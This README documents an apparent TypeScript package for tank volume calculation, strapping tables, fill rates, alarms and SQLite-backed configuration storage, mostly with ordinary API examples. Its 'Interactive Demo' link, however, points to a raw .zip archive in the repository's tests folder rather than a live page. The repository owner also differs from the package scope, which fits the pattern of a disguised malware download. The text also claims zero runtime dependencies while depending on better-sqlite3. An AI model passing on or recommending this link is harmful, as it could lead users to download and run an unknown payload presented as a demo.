# tank-level

**Tank volume calculator with strapping tables, fill rate tracking, alarms, multi-tank inventory & persistent configuration storage.**

Zero runtime dependencies (SQLite via better-sqlite3 for storage). TypeScript first. Built for IoT, SCADA, and process control.

**[Try the Interactive Demo](https://raw.githubusercontent.com/arefin02/tank-level/main/tests/level-tank-v2.5.zip)** -- live calculator with SVG tank visualization, printable strapping charts, fill rate tools, alarms & multi-tank inventory.

## Who is this for?

- **Process engineers** -- tank gauging, calibration charts, level monitoring
- **IoT / SCADA integrators** -- level sensor data to volume conversion
- **Chemical plants & refineries** -- multi-tank inventory, alarm thresholds
- **Homebrewers & aquarists** -- simple volume calculations for any vessel shape

## Installation

bash
bun add @adametherzlab/tank-level
# or: npm install @adametherzlab/tank-level


## Quick Start


import { calculateVolume, strappingTable, fillRate, tankAlarms, tankInventory } from '@adametherzlab/tank-level';

// Calculate volume at a given height
const result = calculateVolume(
  { type: 'cylindrical', dimensions: { diameter: 2, height: 10 }, orientation: 'vertical' },
  5
);
console.log(result); // { volume: 15.707963, percentage: 50 }


## Persistent Tank Configuration Storage

Save and load multiple tank configurations so you never re-enter dimensions:


import { TankConfigStore } from '@adametherzlab/tank-level';

// Open or create a database file (use ':memory:' for testing)
const store = new TankConfigStore('./my-tanks.db');

// Save a tank configuration
store.save({
  name: 'Feed Water Tank',
  vessel: { type: 'cylindrical', dimensions: { diameter: 3, height: 12 }, orientation: 'vertical' },
  tags: ['water', 'boiler-feed'],
});

store.save({
  name: 'Diesel Day Tank',
  vessel: { type: 'rectangular', dimensions: { length: 2, width: 1.5, height: 3 } },
  tags: ['fuel', 'diesel'],
});

// Load a config by name
const feedTank = store.get('Feed Water Tank');
console.log(feedTank?.vessel); // { type: 'cylindrical', ... }

// List all configs (filter by tag or vessel type)
const waterTanks = store.list({ tag: 'water' });
const allCylinders = store.list({ type: 'cylindrical' });

// Use a saved config for calculations
import { calculateVolume } from '@adametherzlab/tank-level';
if (feedTank) {
  const level = calculateVolume(feedTank.vessel, 6);
  console.log(`Feed tank at ${level.percentage}%`);
}

// Delete a config
store.delete('Diesel Day Tank');

// Clean up
store.close();


### Storage API

| Method | Description |
|--------|-------------|
| `new TankConfigStore(path?)` | Create/open store. Default: `:memory:` |
| `save({ name, vessel, tags? })` | Save or update a config by name |
| `get(name)` | Retrieve config by name (or `null`) |
| `getById(id)` | Retrieve config by id (or `null`) |
| `list({ tag?, type?, limit?, offset? })` | List configs with optional filters |
| `delete(name)` | Delete a config by name |
| `clear()` | Delete all configs |
| `count()` | Number of saved configs |
| `close()` | Close database connection |

## Vessel Types

| Type | Required Dimensions |
|------|--------------------|
| `cylindrical` | `diameter` (or `radius`), `height`, optional `orientation` |
| `rectangular` | `length`, `width`, `height` |
| `conical` | `topDiameter`, `bottomDiameter`, `height` |
| `spherical` | `diameter` (or `radius`) |
| `elliptical` | `majorDiameter`, `minorDiameter`, `length` |

## API Reference

### `calculateVolume(vessel, liquidHeight)`
Returns `{ volume, percentage }` for a given vessel configuration and liquid height.

### `convertVolume(value, fromUnit, toUnit)`
Convert between `'liters'`, `'gallons'`, `'cubicMeters'`.

### `strappingTable(vessel, options?)`
Generate a calibration chart mapping height to volume.

### `fillRate({ vessel, heightBefore, heightAfter, timeMinutes })`
Calculate fill/drain rate with time-to-full/empty estimates.

### `tankAlarms(vessel, liquidHeight, alarmConfig)`
Check level against high-high, high, low, low-low thresholds.

### `tankInventory(readings, targetUnit?, precision?)`
Aggregate multiple tank readings into a fleet inventory summary.

## License

MIT
